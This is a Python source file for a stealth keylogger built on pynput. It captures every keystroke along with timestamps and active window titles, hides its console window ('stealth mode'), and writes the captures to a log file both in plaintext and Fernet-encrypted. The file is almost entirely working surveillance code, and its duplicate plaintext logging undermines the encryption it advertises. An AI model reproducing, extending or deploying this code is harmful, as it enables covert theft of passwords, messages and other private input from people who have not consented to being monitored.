import pynput
import os
import sys
from cryptography.fernet import Fernet #try: ignore
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# Generate and store an encryption key
def generate_key():
    return Fernet.generate_key()

def load_key():
    return open("key.key", "rb").read()

def save_key(key):
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Encryption functions
def encrypt_message(message, key):
    return Fernet(key).encrypt(message.encode())

def decrypt_message(encrypted_message, key):
    return Fernet(key).decrypt(encrypted_message).decode()

# Buffer for keystrokes
key_buffer = []

# Initialize encryption key (generate one if it doesn't exist)
if not os.path.exists("key.key"):
    key = generate_key()
    save_key(key)
else:
    key = load_key()

# Hide the console window for stealth mode
def hide_console():
    if os.name == 'nt':  # Windows
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif os.name == 'posix':  # macOS, Linux
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

hide_console()

# Log file setup
logging.basicConfig(filename=("encrypted_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    global key_buffer
    try:
        # Log alphanumeric keys
        key_buffer.append(str(key.char))
    except AttributeError:
        # Log special keys
        key_buffer.append(str(key))
    
    # Log active window and timestamp
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    active_window = os.popen('xdotool getactivewindow getwindowname').read().strip() if os.name == 'posix' else 'N/A'
    
    log_entry = f'[{current_time}] [{active_window}] {"".join(key_buffer)}'
    logging.info(log_entry)
    
    if len(key_buffer) >= 10:  # Adjust buffer size as needed
        write_buffered_keys()

def write_buffered_keys():
    global key_buffer
    encrypted_data = encrypt_message("".join(key_buffer), key)
    with open("encrypted_log.txt", "ab") as f:
        f.write(encrypted_data + b"\n")
    key_buffer = []

def on_release(key):
    if key == Key.esc:
        write_buffered_keys()  # Write any remaining buffered keys before exiting
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
